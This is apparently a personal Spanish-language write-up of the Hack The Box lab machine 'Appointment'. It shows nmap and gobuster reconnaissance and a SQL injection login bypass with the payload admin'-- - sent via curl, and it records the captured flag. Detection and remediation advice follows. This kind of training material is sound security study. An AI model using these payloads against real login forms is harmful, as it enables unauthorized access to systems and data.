---
tags:
  - htb
  - starting-point
  - tier-1
  - easy
  - linux
  - sqli
  - web
  - en-progreso
ip: 10.129.250.149
os: Linux
difficulty: Easy
status: Terminada
tiempo: 1h 0m
fecha_inicio: 2026-08-10
fecha_completada: —
puntos: 0
mitre_tactics:
  - Initial Access
  - Reconnaissance
mitre_techniques:
  - T1190
  - T1595
---

# 🖥️ Appointment — Linux — Easy (Tier 1)

> [!info] Resumen
> **IP:** `10.129.250.149` | **OS:** Linux | **Tier/Fase:** 2 | **Tiempo:** 0h 0m
> Servidor web con formulario de login vulnerable a SQL Injection — bypass sin credenciales válidas.

---

## 1. Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 10.129.250.149 -oN nmap.txt
```

| Puerto | Servicio | Versión             | Hallazgo clave                                         |
| ------ | -------- | ------------------- | ------------------------------------------------------ |
| 80/TCP | http     | Apache httpd 2.4.38 | http-title: Login<br>http-server-header: Apache/2.4.38 |

**→ Vector:** Formulario de login web — intentar SQLi antes de buscar credenciales.

```bash
# Enumerar directorios
gobuster dir -u http://10.129.250.149/ -w /usr/share/wordlists/dirb/common.txt -x php,html
```

![[Pasted image 20260810212152.png]]

---

## 2. Explotación

> Vector principal: SQL Injection — Login Bypass (misconfiguration: query concatenada sin prepared statements)

```bash
# Identificar campos del formulario
curl -s http://10.129.250.149/index.php | grep -A 20 '<form'
Hallazgos: Acá se encuentra el cuerpo de la página de login, donde se puede encontrar el input y nombre de la variable username y password, ambas como input para escribir el login.

# Payload de bypass
curl -s -X POST http://10.129.250.149/index.php -d "username=admin'-- -&password=x" -L   
  

# Extraer flag
curl -s -X POST 'http://10.129.250.149/index.php' -d "username=admin'-- -&password=x" -L | grep -oE 'Your flag is: [^<]+
```

> [!success] Flag obtenida
> `e3d0796d002a446c0e622226f42e9672
`

---

## 3. Escalación de Privilegios

N/A — login bypass directo, flag en dashboard post-login.

---

## 4. MITRE ATT&CK

| Táctica        | Técnica                           | ID     | Uso en esta máquina                         |
| -------------- | --------------------------------- | ------ | ------------------------------------------- |
| Reconnaissance | Active Scanning                   | T1595  | nmap + gobuster para mapear servicios web   |
| Initial Access | Exploit Public-Facing Application | T1190  | SQLi en formulario de login sin sanitización |

---

## 5. Detección & Remediación

**Blue Team detecta:**
- Caracteres SQLi en logs HTTP: `'`, `--`, `OR+1%3D1` en parámetros POST del login
- Múltiples 401 seguidos de 200 en corto tiempo → posible fuerza bruta de payloads
- WAF (ModSecurity + OWASP CRS): bloquea patrones SQLi conocidos antes de que lleguen a la app

**Remediación:**
- Usar prepared statements / parametrized queries (PDO en PHP, $stmt->bind_param)
- Nunca construir queries SQL por concatenación de strings con input del usuario
- Implementar rate limiting en endpoints de login (max 5-10 intentos por IP)

---

## 6. Lecciones

- SQLi login bypass no requiere conocer credenciales — basta romper la lógica de la query con `'--`
- Probar siempre `--` (ANSI) y `#` (MySQL) como comentadores; la respuesta del servidor indica el motor
- En producción real: formularios sin prepared statements son frecuentes en software legacy — este patrón se repite

**Bloqueado:**

| Fase        | Causa                      | Fix                                                                                              |
| ----------- | -------------------------- | ------------------------------------------------------------------------------------------------ |
| Explotación | no lograba entrar al login | En el usuario faltaba poner admin'-- -<br>Me faltaba un espacio y un guión, a lo que pude entrar |

---

## 7. ¿Qué vería un Threat Hunter?

- Payload con comillas simples, `--` o `#` en el body de un POST a `/index.php` — patrón SQLi clásico detectable por firma en cualquier WAF/IDS con reglas OWASP CRS.
- Bypass exitoso sin secuencia previa de intentos fallidos: un login que autentica al primer intento con un payload no-credencial es indistinguible de un usuario legítimo solo si no se inspecciona el contenido del campo `username` — de ahí que la detección dependa 100% de logging a nivel de aplicación, no de contadores de fallos.
- Ausencia de rate limiting: nada impidió repetir la prueba de payloads sin cooldown — en un entorno monitoreado, ráfagas de POST al mismo endpoint con distintos payloads en segundos son una señal de reconocimiento activo.

---

## 8. Conexiones

- Similar: `[[HTB/Vaccine/Vaccine]]` (SQLi + sqlmap — siguiente nivel)
- Técnica: `[[Técnicas/SQL-Injection]]`
- Teoría: [`Teoria_SQLi_LoginBypass`](obsidian://open?vault=RedTeamLab&file=HTB%2FAppointment%2FTeoria_SQLi_LoginBypass.pdf)

**Referencias:** [HackTricks - SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection) · [OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection) · [PortSwigger SQLi](https://portswigger.net/web-security/sql-injection)
